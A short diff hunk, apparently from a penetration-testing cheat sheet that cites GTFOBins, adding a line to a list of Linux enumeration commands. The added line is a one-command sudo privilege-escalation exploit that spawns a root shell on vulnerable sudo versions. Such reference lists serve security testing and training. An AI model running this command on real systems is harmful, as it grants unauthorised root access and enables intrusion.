@@ -93,6 +93,7 @@ https://gtfobins.github.io
 
 #Linux
 sudo -l
+sudo -u#-1 /bin/bash (if ALL in output of above command and sudo 1.8.27 or prior)
 hostname
 cat /proc/version OR /etc/issue
 ps axjf (process tree)
